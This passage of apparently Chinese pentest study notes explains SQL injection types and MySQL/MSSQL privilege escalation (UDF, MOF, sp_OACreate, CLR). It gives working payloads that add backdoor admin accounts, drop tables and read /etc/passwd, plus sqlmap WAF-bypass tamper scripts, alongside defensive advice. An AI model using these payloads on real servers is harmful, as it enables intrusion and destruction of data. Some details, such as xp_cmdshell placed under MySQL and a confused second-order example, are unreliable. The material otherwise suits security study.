1=1--</code></p></li><li><p><strong>应用处理</strong>：假设应用在<strong>更新操作</strong>时对用户输入做了严格的过滤，但数据库中的<strong>新增操作</strong>没有。攻击者在第一次新增时，输入一个看似无害的用户名，例如 <code>test</code></p></li></ol><p><strong>漏洞的真正利用</strong>：<br>现在，假设应用有一个功能，允许用户修改自己的个人信息，而这个功能在设计时存在缺陷</p><ul><li><strong>正常的修改用户信息 SQL 语句</strong>：</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> users <span class="keyword">SET</span> email <span class="operator">=</span> <span class="string">&#x27;user@example.com&#x27;</span> <span class="keyword">WHERE</span> username <span class="operator">=</span> <span class="string">&#x27;test&#x27;</span>;</span><br></pre></td></tr></table></figure><ul><li><strong>攻击者如何利用</strong>：</li></ul><ol><li><p><strong>第一次注入</strong>：攻击者注册一个名为 <code>test</code> 的账户。这个数据被安全地存储在数据库中</p></li><li><p><strong>第二次注入</strong>：攻击者找到一个功能，例如“修改评论”，而这个功能会将评论内容与用户名关联起来。假设评论表是 <code>comments</code>，并且 <code>username</code> 列没有做任何过滤</p></li></ol><p>攻击者提交了一条评论，内容为 <code>&#39; or 1=1--</code>。数据库执行了如下语句：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT INTO</span> comments (username, content) <span class="keyword">VALUES</span> (<span class="string">&#x27;test&#x27;</span>, <span class="string">&#x27;&#x27;</span> <span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span><span class="comment">--&#x27;);</span></span><br></pre></td></tr></table></figure><p>此时，恶意数据 <code>&#39; or 1=1--</code> 被安全地存储在了 <code>comments</code> 表中</p><ol><li><strong>触发漏洞</strong>：现在，应用中有一个<strong>管理员审核评论</strong>的功能。管理员点击审核按钮后，后端会执行一个不安全的查询，例如：</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> comments <span class="keyword">WHERE</span> content <span class="operator">=</span> <span class="string">&#x27;&#x27;</span> <span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span><span class="comment">--&#x27;;</span></span><br></pre></td></tr></table></figure><p>这条查询语句由于没有对 <code>content</code> 字段进行二次过滤，导致 <code>or 1=1--</code> 被当作 SQL 语句的一部分，从而绕过了原本的逻辑，直接获取了 <code>comments</code> 表中的所有数据，甚至可以被进一步利用进行数据泄露或篡改</p><h2 id="union注入"><a href="#union注入" class="headerlink" title="union注入"></a>union注入</h2><p>假设一个网站的查询语句是这样拼接的：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> id <span class="operator">=</span> <span class="string">&#x27;用户输入&#x27;</span>;</span><br></pre></td></tr></table></figure><p>如果用户输入 <code>1</code>，执行的 SQL 语句就是：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> id <span class="operator">=</span> <span class="string">&#x27;1&#x27;</span>;</span><br></pre></td></tr></table></figure><p><strong>堆叠注入攻击</strong></p><p>如果攻击者在输入框中输入 <code>1; DROP TABLE users</code>，并且后端没有过滤分号，最终执行的 SQL 语句就会变成：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> id <span class="operator">=</span> <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> users;</span><br></pre></td></tr></table></figure><p>数据库服务器会按顺序执行这两条语句。第一条是正常的查询，第二条则是<strong>删除</strong> <code>users</code> <strong>表</strong>的恶意命令</p><h2 id="MySQL提权"><a href="#MySQL提权" class="headerlink" title="MySQL提权"></a>MySQL提权</h2><h4 id="UDF-提权（User-Defined-Function，用户自定义函数提权）"><a href="#UDF-提权（User-Defined-Function，用户自定义函数提权）" class="headerlink" title="UDF 提权（User-Defined Function，用户自定义函数提权）"></a>UDF 提权（User-Defined Function，用户自定义函数提权）</h4><p>UDF 提权是 MySQL 提权场景中最经典、应用最广泛的方式之一。其核心原理是利用 MySQL 支持加载自定义函数（UDF）的特性 —— 用户可通过 C&#x2F;C++ 编写包含系统命令执行逻辑的动态库文件，将其加载到 MySQL 中并注册为自定义函数，从而突破数据库层面限制，执行操作系统命令实现提权。<br><strong>前提条件</strong></p><ol><li><p><strong>权限要求</strong>：当前 MySQL 账户必须具备 <code>CREATE FUNCTION</code>（创建自定义函数）和 <code>FILE</code>（文件读写）权限，若需加载插件形式的 UDF 还需 <code>SUPER</code> 权限（MySQL 5.1 及以上版本）；</p></li><li><p><strong>路径与权限要求</strong>：需知晓 MySQL 插件目录（可通过 <code>show variables like &#39;%plugin_dir%&#39;;</code> 查询），且该目录对 MySQL 进程具备可写权限；</p></li><li><p><strong>版本适配</strong>：UDF 库文件需与 MySQL 版本、服务器系统架构（32&#x2F;64 位）匹配（如 Linux 对应 <code>.so</code> 文件，Windows 对应 <code>.dll</code> 文件）。<br><strong>攻击步骤</strong><br><strong>步骤 1：上传恶意 UDF 库文件</strong></p></li></ol><p>攻击者通过 SQL 注入、文件写入漏洞（如 <code>SELECT ... INTO OUTFILE</code>），将预编译的恶意 UDF 动态库文件（如 Linux 下的 <code>lib_mysqludf_sys.so</code>、Windows 下的 <code>mysqludf.dll</code>）写入 MySQL 插件目录：</p><ul><li><p>Linux 典型插件目录：<code>/usr/lib/mysql/plugin/</code>（不同发行版可能为 <code>/usr/lib64/mysql/plugin/</code>）；</p></li><li><p>Windows 典型插件目录：<code>C:\Program Files\MySQL\MySQL Server\版本号\lib\plugin\</code>。<br>文件写入示例（Linux）：</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-- 利用 FILE 权限将 UDF 库文件写入插件目录（需先通过 hex 编码规避字符过滤）</span><br><span class="line">SELECT 0x7F454C46...（UDF文件十六进制内容） INTO DUMPFILE &#x27;/usr/lib/mysql/plugin/lib_mysqludf_sys.so&#x27;;</span><br></pre></td></tr></table></figure><p>十六进制可以看另一篇文章<a href="https://www.sqlsec.com/udf/">MySQL UDF 提权十六进制查询 | 国光</a></p><p><strong>步骤 2：注册恶意自定义函数</strong></p><p>通过 <code>CREATE FUNCTION</code> 语句，将 UDF 库中的系统命令执行函数（如 <code>sys_exec</code>、<code>sys_eval</code>）注册为 MySQL 可调用函数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-- 注册 sys_eval 函数（执行系统命令并返回输出结果）</span><br><span class="line">CREATE FUNCTION sys_eval RETURNS STRING SONAME &#x27;lib_mysqludf_sys.so&#x27;;</span><br><span class="line">-- 注册 sys_exec 函数（执行系统命令，无返回结果，适合创建用户、启动服务等操作）</span><br><span class="line">CREATE FUNCTION sys_exec RETURNS INT SONAME &#x27;lib_mysqludf_sys.so&#x27;;</span><br></pre></td></tr></table></figure><p><strong>步骤 3：执行系统命令实现提权</strong></p><p>调用已注册的恶意函数，执行任意系统命令，获取操作系统层面的高权限：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">-- 查看当前执行命令的用户（验证提权基础）</span><br><span class="line">SELECT sys_eval(&#x27;whoami&#x27;);</span><br><span class="line">-- Linux 下添加 root 权限用户</span><br><span class="line">SELECT sys_eval(&#x27;useradd -m -s /bin/bash hackuser &amp;&amp; echo &quot;hackuser:123456&quot; | chpasswd&#x27;);</span><br><span class="line">-- Windows 下添加管理员用户</span><br><span class="line">SELECT sys_eval(&#x27;net user hackuser 123456 /add &amp;&amp; net localgroup administrators hackuser /add&#x27;);</span><br></pre></td></tr></table></figure><p><strong>防御方法</strong></p><ol><li><p><strong>最小权限原则</strong>：严格限制 MySQL 账户权限，普通业务账户仅授予 <code>SELECT/INSERT/UPDATE/DELETE</code> 等必要权限，禁止授予 <code>FILE</code>、<code>CREATE FUNCTION</code>、<code>SUPER</code> 等高权限；</p></li><li><p><strong>加固文件读写配置</strong>：修改 MySQL 配置文件 <code>my.cnf</code>（Linux）&#x2F;<code>my.ini</code>（Windows），设置 <code>secure_file_priv</code> 为指定安全目录（如 <code>secure_file_priv = /tmp/mysql_file/</code>）或 <code>NULL</code>（完全禁止文件导入导出），重启 MySQL 生效；</p></li><li><p><strong>限制插件目录权限</strong>：将 MySQL 插件目录的写入权限仅开放给 root 用户，禁止 MySQL 进程账户（如 <code>mysql</code> 用户）修改该目录内容；</p></li><li><p><strong>定期审计</strong>：检查 <code>mysql.func</code> 表（存储自定义函数），及时清理非授权的 UDF 函数；</p></li><li><p><strong>版本升级</strong>：升级至 MySQL 8.0+ 版本，该版本对 UDF 加载增加了更严格的权限和路径校验。</p></li></ol><h4 id="MOF-提权（Managed-Object-Format，托管对象格式提权）"><a href="#MOF-提权（Managed-Object-Format，托管对象格式提权）" class="headerlink" title="MOF 提权（Managed Object Format，托管对象格式提权）"></a>MOF 提权（Managed Object Format，托管对象格式提权）</h4><p>只针对Windows管用，利用 Windows 系统 WMI（Windows 管理规范）服务的配置缺陷，特定版本的 Windows 系统会自动加载并执行 <code>%systemroot%\system32\wbem\mof</code> 目录下的 MOF 文件，攻击者通过 MySQL 的文件写入权限将恶意 MOF 文件写入该目录，触发系统执行命令实现提权<br><strong>Windows 自动执行 MOF 文件的核心原因?</strong><br><code>%systemroot%\system32\wbem\mof</code> 是 Windows 为 WMI 预留的 默认类定义目录，系统自动执行该目录下的 MOF 文件，本质是为了 初始化 WMI 功能，具体逻辑如下：<br>简化系统管理与类注册，自动触发，无需手动干预</p><ul><li><p>WMI 本身只提供 “管理框架”，但 “能管理哪些资源”（比如进程、服务、磁盘）需要通过 “类定义” 来告知 WMI。</p></li><li><p>微软将常用的系统管理类（如 <code>Win32_Process</code>、<code>Win32_Service</code>）以 MOF 文件的形式预置于 <code>mof</code> 目录（比如系统自带的 <code>wbemcons.mof</code>、<code>cimwin32.mof</code>）。</p></li><li><p>系统启动时，<code>Winmgmt</code> 服务会自动扫描该目录，调用 <code>mofcomp.exe</code> 编译所有 MOF 文件，将类注册到 WMI 仓库 —— 这样 WMI 才能正常提供管理功能（比如用户用 <code>wmic process list</code> 查询进程时，就能识别 <code>Win32_Process</code> 类）。<br><strong>执行时机：自动触发，无需手动干预</strong></p></li><li><p>系统启动时（<code>Winmgmt</code> 服务启动）；</p></li><li><p><code>Winmgmt</code> 服务重启时；</p></li><li><p>手动将 MOF 文件复制到该目录后（部分系统会实时监控目录变化）。<br><strong>这个目录是 WMI 的 “类定义加载目录”，系统自动执行其中的 MOF 文件，是为了让 WMI 获得管理系统所需的 “元数据”</strong><br><strong>前提条件</strong></p></li></ul><ol><li><p><strong>系统环境</strong>：仅适用于 Windows Server 2003&#x2F;2008（Windows 7&#x2F;2012 及以上版本已修复该缺陷）；</p></li><li><p><strong>权限要求</strong>：MySQL 账户需具备 <code>FILE</code> 权限，可执行 <code>SELECT ... INTO OUTFILE</code> 写入文件；</p></li><li><p><strong>路径权限</strong>：MySQL 进程账户需对 <code>%systemroot%\system32\wbem\mof</code> 目录具备写入权限。<br><strong>攻击步骤</strong></p></li></ol><p><strong>步骤1：写恶意MOF文件</strong><br>MOF 文件是 WMI 的元数据定义文件，攻击者编写包含系统命令执行逻辑的 MOF 文件（核心是通过 <code>__EventFilter</code>、<code>__EventConsumer</code> 等 WMI 类绑定事件，触发命令执行），示例核心内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#pragma namespace(&quot;\\\\.\\root\\subscription&quot;)</span><br><span class="line">instance of __EventFilter as $EventFilter &#123;</span><br><span class="line">    Name = &quot;MyFilter&quot;;</span><br><span class="line">    EventNamespace = &quot;Root\\CIMV2&quot;;</span><br><span class="line">    Query = &quot;SELECT * FROM __InstanceModificationEvent WHERE TargetInstance ISA &#x27;Win32_LocalTime&#x27; AND TargetInstance.Second = 0&quot;;</span><br><span class="line">    QueryLanguage = &quot;WQL&quot;;</span><br><span class="line">&#125;;</span><br><span class="line">instance of ActiveScriptEventConsumer as $Consumer &#123;</span><br><span class="line">    Name = &quot;MyConsumer&quot;;</span><br><span class="line">    ScriptingEngine = &quot;VBScript&quot;;</span><br><span class="line">    ScriptText = &quot;Set objShell = CreateObject(\&quot;WScript.Shell\&quot;)\nobjShell.Run(\&quot;net user hackuser 123456 /add &amp; net localgroup administrators hackuser /add\&quot;)&quot;;</span><br><span class="line">&#125;;</span><br><span class="line">instance of __FilterToConsumerBinding as $Binding &#123;</span><br><span class="line">    Consumer = $Consumer;</span><br><span class="line">    Filter = $EventFilter;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>上述 MOF 文件的作用：系统每分钟（秒数为 0 时）触发 VBScript 脚本，创建名为 <code>hackuser</code> 的管理员账户。<br><strong>步骤 2：写入恶意 MOF 文件</strong></p><p>利用 MySQL 的 <code>FILE</code> 权限，将恶意 MOF 文件写入 Windows 系统的指定目录：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 将 MOF 内容写入 %systemroot%\system32\wbem\mof 目录（需替换为实际系统路径）</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="string">&#x27;#pragma namespace(&quot;\\\\.\\root\\subscription&quot;)...&#x27;</span>（MOF 文件内容） <span class="keyword">INTO</span> OUTFILE <span class="string">&#x27;C:\\WINDOWS\\system32\\wbem\\mof\\hack.mof&#x27;</span>;</span><br></pre></td></tr></table></figure><p><strong>步骤 3：触发 MOF 文件执行</strong></p><p>Windows 的 CIMOM（Common Information Model Object Manager）服务会周期性扫描 <code>%systemroot%\system32\wbem\mof</code> 目录，自动加载并执行新写入的 MOF 文件。一旦文件被加载，其中的命令会立即或按设定周期执行，攻击者即可获得系统管理员权限。</p><p><strong>防御方法</strong></p><ol><li><p><strong>核心权限管控</strong>：禁止 MySQL 账户获取 <code>FILE</code> 权限，从源头阻止文件写入；</p></li><li><p><strong>系统版本升级</strong>：将 Windows 服务器升级至 Windows Server 2012 及以上版本，该版本修复了 MOF 文件自动执行的缺陷；</p></li><li><p><strong>目录权限加固</strong>：限制 <code>%systemroot%\system32\wbem\mof</code> 目录的写入权限，仅允许 SYSTEM 和 Administrators 组修改；</p></li><li><p><strong>监控 WMI 事件</strong>：开启 Windows 系统的 WMI 事件审计，及时发现非授权的 MOF 文件加载和事件绑定操作。</p></li></ol><p><strong>总结</strong></p><ol><li><p>UDF 提权跨平台（Linux&#x2F;Windows），核心依赖 MySQL 的自定义函数加载和文件读写权限，防御重点是权限管控和配置加固；</p></li><li><p>MOF 提权仅适用于老旧 Windows 系统，核心利用 WMI 服务的自动加载机制，防御重点是系统升级和目录权限限制；</p></li><li><p>两种提权方式的核心防御共性：遵循最小权限原则，严格限制 MySQL 账户的高风险权限，定期审计系统和数据库的非授权操作。</p></li></ol><h2 id="MySQL-的-xp-cmdshell-函数被禁用怎么绕过"><a href="#MySQL-的-xp-cmdshell-函数被禁用怎么绕过" class="headerlink" title="MySQL 的 xp_cmdshell() 函数被禁用怎么绕过"></a>MySQL 的 xp_cmdshell() 函数被禁用怎么绕过</h2><ol><li><strong>利用其他扩展存储过程</strong><br>MSSQL 中还有一些其他的扩展存储过程，它们可能没有 xp_cmdshell 那么直接，但仍然可以用于执行命令或读写文件。</li></ol><p>sp_OACreate（OLE Automation Procedures）<br>该过程通常用于创建 COM 对象，若能找到合适的 COM 对象（如 WScript.Shell），可利用其执行命令。</p><p><strong>示例代码</strong>：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DECLARE</span> <span class="variable">@shell</span> <span class="type">INT</span>;</span><br><span class="line"><span class="keyword">EXEC</span> sp_OACreate <span class="string">&#x27;WScript.Shell&#x27;</span>, <span class="variable">@shell</span> <span class="keyword">OUT</span>;</span><br><span class="line"><span class="keyword">EXEC</span> sp_OAMethod <span class="variable">@shell</span>, <span class="string">&#x27;run&#x27;</span>, <span class="keyword">NULL</span>, <span class="string">&#x27;cmd.exe /c whoami &gt; C:\temp\output.txt&#x27;</span>;</span><br><span class="line"><span class="comment">-- 之后你可以读取 output.txt 来获取结果</span></span><br></pre></td></tr></table></figure><p><strong>注意</strong>：这种方法依赖于是否启用了 OLE Automation Procedures，并且需要寻找可以被利用的 COM 对象。</p><ol><li><strong>SQL Server Agent Jobs</strong><br>若 SQL Server Agent 服务正在运行，且你拥有创建作业的权限，可创建新的 Agent Job，在其中执行 PowerShell 或命令行脚本。</li></ol><p><strong>攻击步骤</strong></p><ol start="2"><li><strong>创建作业（Job）</strong>：创建一个 SQL Agent Job，步骤类型（Step Type）选择 Operating system (CmdExec) 或 PowerShell；</li><li><strong>编写脚本</strong>：在步骤中直接写入要执行的命令；</li><li><strong>启动作业</strong>：启动该作业，命令会在 SQL Server Agent 的权限下执行。</li></ol><p><strong>说明</strong>：这种方法的好处是，即使 xp_cmdshell 被禁用，Agent Job 依然可以运行。但前提是，你有权限创建并执行作业。</p><ol><li><strong>CLR Assembly</strong><br>SQL Server 提供了 CLR（Common Language Runtime）集成功能，允许在数据库中运行 .NET 代码。若能创建恶意的 CLR Assembly，并在其中编写执行命令的代码，可绕过 xp_cmdshell。</li></ol><p>操作步骤</p><ol><li><strong>启用 CLR</strong></li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">EXEC</span> sp_configure <span class="string">&#x27;clr enabled&#x27;</span>, <span class="number">1</span>;</span><br><span class="line">RECONFIGURE;</span><br></pre></td></tr></table></figure><ol><li><strong>创建并部署 Assembly</strong><br>编写 C# 代码（使用 System.Diagnostics.Process 类执行命令），编译成 DLL 后上传到数据库；再创建 SQL 存储过程调用 Assembly 中的方法。</li></ol><p><strong>C# 代码示例</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">using System;</span><br><span class="line">using System.Diagnostics;</span><br><span class="line">using System.Data.SqlClient;</span><br><span class="line">using Microsoft.SqlServer.Server;</span><br><span class="line"></span><br><span class="line">public class StoredProcedures</span><br><span class="line">&#123;</span><br><span class="line">[SqlProcedure]</span><br><span class="line">public static void CmdExec(string command)</span><br><span class="line">&#123;</span><br><span class="line">Process.Start(&quot;cmd.exe&quot;, &quot;/c &quot; + command);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>SQL Server 端代码</strong>：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 创建 Assembly</span></span><br><span class="line"><span class="keyword">CREATE</span> ASSEMBLY CommandExec <span class="keyword">FROM</span> <span class="string">&#x27;C:\path\to\YourAssembly.dll&#x27;</span> <span class="keyword">WITH</span> PERMISSION_SET <span class="operator">=</span> UNSAFE;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 创建存储过程</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">PROCEDURE</span> sp_CmdExec <span class="variable">@command</span> NVARCHAR(<span class="number">4000</span>) <span class="keyword">AS</span></span><br><span class="line"><span class="keyword">EXTERNAL</span> NAME [YourAssembly].[StoredProcedures].[CmdExec];</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 执行</span></span><br><span class="line"><span class="keyword">EXEC</span> sp_CmdExec <span class="string">&#x27;whoami&#x27;</span>;</span><br></pre></td></tr></table></figure><p><strong>注意</strong>：CLR Assembly 功能通常默认禁用，且创建 UNSAFE 权限集的 Assembly 需要 sysadmin 权限。</p><h2 id="MySQL5-0上下版本区别"><a href="#MySQL5-0上下版本区别" class="headerlink" title="MySQL5.0上下版本区别"></a>MySQL5.0上下版本区别</h2><h4 id="information-schma的有无"><a href="#information-schma的有无" class="headerlink" title="information_schma的有无"></a><strong>information_schma的有无</strong></h4><p>5.0版本以上：有，<strong>方便枚举出整个数据库的结构</strong>，使用像 <strong>SQLmap</strong> 这样的自动化工具<br>5.0版本以下：无，<strong>依赖盲注和字典攻击</strong></p><h4 id="并发操作模式"><a href="#并发操作模式" class="headerlink" title="并发操作模式"></a>并发操作模式</h4><p><strong>MySQL 5.0 以下</strong>：</p><ul><li><strong>多用户单操作</strong>：这个说法通常是指<strong>不完全支持多用户并发</strong>，或者并发控制机制相对简单。在某些版本中，对同一资源的并发访问可能导致锁定和性能问题。从渗透角度看，这可能导致一些复杂的注入技术（如基于锁定的时间盲注）效果不佳，但影响相对较小</li></ul><p><strong>MySQL 5.0 及以上</strong>：</p><ul><li><strong>多用户多操作</strong>：这通常指的是<strong>更好的并发控制</strong>和<strong>事务支持</strong>。MySQL 5.0 引入了<strong>事务</strong>和更强大的锁机制，使得多个用户可以同时对数据库进行复杂操作，而不会相互干扰。这对于正常的业务应用至关重要</li></ul><h2 id="SQLMap自带的脚本"><a href="#SQLMap自带的脚本" class="headerlink" title="SQLMap自带的脚本"></a>SQLMap自带的脚本</h2><p><strong>1. 编码与混淆（绕过签名检测）</strong><br>这类脚本通过对注入语句进行编码或转换，来改变其特征，以躲避基于签名的检测</p><ul><li><p><code>charencode.py</code>：对所有字符进行 URL 编码，适用于 URL 编码绕过</p></li><li><p><code>randomcase.py</code>：将 SQL 关键字的字母大小写随机化</p></li><li><p><strong>示例：</strong> <code>SELECT</code> -&gt; <code>sELeCT</code></p></li><li><p><code>space2comment.py</code>：将空格替换为 SQL 注释 <code>/**/</code></p></li><li><p><strong>示例：</strong> <code>SELECT user FROM users</code> -&gt; <code>SELECT/**/user/**/FROM/**/users</code></p></li><li><p><code>space2mysqlblank.py</code>：用 MySQL 专有的空格字符（如 Tab、换行符）替换空格</p></li><li><p><code>base64encode.py</code>：对整个注入语句进行 Base64 编码。需要目标网站解码才能生效</p></li></ul><p><strong>2. 空白字符与分隔符替换</strong><br>这类脚本利用不同数据库对空白字符的解析差异来绕过过滤</p><ul><li><p><code>apostrophemask.py</code>：将单引号 <code>&#39;</code> 替换为 UTF-8 编码的 <code>&#39;</code></p></li><li><p><code>equaltolike.py</code>：将等号   &#x3D;   替换为 <code>LIKE</code> 关键字</p></li><li><p><strong>示例：</strong> <code>id=1</code> -&gt; <code>id LIKE 1</code></p></li><li><p><code>unionalltounion.py</code>：将 <code>UNION ALL</code> 替换为 <code>UNION</code>，在某些情况下可能绕过过滤</p></li><li><p><code>space2plus.py</code>：将空格替换为加号 <code>+</code>，但需要注意这可能影响语句语义</p></li></ul><p><strong>3. 语义与结构混淆</strong><br>这类脚本通过改变语句的逻辑结构，来使注入语句看起来像正常的查询</p><ul><li><p><code>between.py</code>：将大于等于 <code>&gt;=</code> 替换为 <code>BETWEEN</code></p></li><li><p><strong>示例：</strong> <code>id&gt;=1</code> -&gt; <code>id BETWEEN 1 AND 999</code></p></li><li><p><code>ifnull2casewhenisnull.py</code>：将 <code>IFNULL(A, B)</code> 替换为 <code>CASE WHEN ISNULL(A) THEN B ELSE A END</code></p></li></ul><p><strong>4. 绕过 WAF 的特定脚本</strong><br>这些脚本通常针对特定的安全产品或通用 WAF 规则</p><ul><li><p><code>modsecurityzeroversioned.py</code>：在 SQL 语句后添加 <code>/*-!11111*/</code> 来绕过 ModSecurity WAF 的特定规则</p></li><li><p><code>xforwardedfor.py</code>：在 HTTP 请求头中伪造 <code>X-Forwarded-For</code> 字段，以绕过基于 IP 的限制</p></li><li><p><code>sp_password.py</code>：在有效载荷的末尾添加 <code>sp_password</code> 来绕过 MS-SQL Server 的日志记录</p></li></ul><h2 id="扫出-asp数据库，访问乱码怎么利用"><a href="#扫出-asp数据库，访问乱码怎么利用" class="headerlink" title="扫出.asp数据库，访问乱码怎么利用"></a>扫出.asp数据库，访问乱码怎么利用</h2><p>用微软的access打开<br>用<img src="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1766289593014-0a1aeb5c-f0b1-404d-bc2f-ecc12b80b8c8.jpg" alt="null">打开<br>如果密码字段是加密或散列（hash）的，需要进一步处理<br><strong>常见哈希类型</strong>：MD5、SHA1 等<br>破解方法：<br>在线查询：如果哈希值是常见的，可以尝试在 HashKiller、Crackstation 等在线网站查询。<br>字典破解：使用 John the Ripper 或 Hashcat 等工具，配合强大的密码字典进行暴力破解。<br>彩虹表：使用预先计算好的彩虹表进行快速查询</p><h2 id="找到注入点怎么判断何种数据库"><a href="#找到注入点怎么判断何种数据库" class="headerlink" title="找到注入点怎么判断何种数据库"></a>找到注入点怎么判断何种数据库</h2><h4 id="看报错信息"><a href="#看报错信息" class="headerlink" title="看报错信息"></a>看报错信息</h4><ul><li><p><strong>MySQL</strong>：<code>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use</code></p></li><li><p><strong>SQL Server</strong>：<code>Microsoft OLE DB Provider for SQL Server</code>、<code>Incorrect syntax near &#39;...</code></p></li><li><p><strong>Oracle</strong>：<code>ORA-01756: quoted string not properly terminated</code></p></li><li><p><strong>PostgreSQL</strong>：<code>PostgreSQL query failed: ERROR: parser: parse error</code></p></li><li><p><strong>SQLite</strong>：<code>sqlite_query()</code>、<code>SQL syntax error</code></p></li></ul><h4 id="函数和语法判断"><a href="#函数和语法判断" class="headerlink" title="函数和语法判断"></a>函数和语法判断</h4><h5 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">version()</span><br><span class="line">sleep()   如果延迟了5秒，可能是MySQL</span><br><span class="line">user()</span><br><span class="line">database()</span><br><span class="line">loadfile()    and load_file(&#x27;/etc/passwd&#x27;)</span><br></pre></td></tr></table></figure><h5 id="SQLServer"><a href="#SQLServer" class="headerlink" title="SQLServer"></a>SQLServer</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">@@version：and 1=1 and @@version。如果页面返回版本信息，则是 SQL Server</span><br><span class="line"></span><br><span class="line">xp_cmdshell：and 1=1;exec xp_cmdshell(&#x27;ping 127.0.0.1&#x27;)--。如果请求延迟，可能存在命令执行漏洞</span><br><span class="line"></span><br><span class="line">db_name()：and db_name()</span><br><span class="line"></span><br><span class="line">system_user：and system_user</span><br></pre></td></tr></table></figure><h5 id="Oracle"><a href="#Oracle" class="headerlink" title="Oracle"></a>Oracle</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">user：and user</span><br><span class="line"></span><br><span class="line">sys.dba_tables：and 1=1 and (select count(*) from sys.dba_tables)。如果返回正常的页面，说明存在这张表</span><br><span class="line"></span><br><span class="line">dbms_pipe.receive_message()：and 1=1 and dbms_pipe.receive_message(&#x27;a&#x27;,5)。可以用来进行带外信道（OOB）注入</span><br></pre></td></tr></table></figure><h5 id="PostgreSQL-1"><a href="#PostgreSQL-1" class="headerlink" title="PostgreSQL"></a>PostgreSQL</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pg_sleep()：and pg_sleep(5)。如果页面延迟，很可能是 PostgreSQL</span><br><span class="line"></span><br><span class="line">version()：and version()</span><br><span class="line"></span><br><span class="line">pg_database：and 1=1 and (select count(*) from pg_database)</span><br></pre></td></tr></table></figure><h5 id="不同数据库的查询区别"><a href="#不同数据库的查询区别" class="headerlink" 